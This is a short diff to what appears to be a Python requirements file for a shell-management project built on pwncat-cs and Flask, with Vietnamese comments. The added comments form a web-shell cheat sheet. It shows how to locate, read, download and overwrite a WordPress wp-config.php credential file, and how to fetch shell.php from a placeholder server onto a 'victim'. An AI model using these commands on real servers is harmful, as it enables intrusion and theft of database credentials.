@@ -50,3 +50,12 @@ pwncat-cs
 flask-socketio
 #quản lý shell
 psutil
+
+# :file_find -vector sh_find -ftype f / wp-config.php                                                         =>search filename and folder name
+# :file_read /var/www/html/wp-config.php                                                                      =>read file
+# :file_download -vector base64 /var/www/html/wp-config.php /home/kali/Desktop/test_all_thing/wp-config.php
+# :file_upload -vector base64 /home/kali/Desktop/test_all_thing/wp-config.php /var/www/html/wp-config.php      =>upload file
+# :file_webdownload http://yourserver.com/shell.php /tmp/shell.php                                             => download file in web to victim
+
+# để dồng bộ hóa dữ liệu với database
+# cd /home/kali/Desktop/myproject/KuBao-DangAfrica && source env/bin/activate && export FLASK_APP=run.py && flask db current
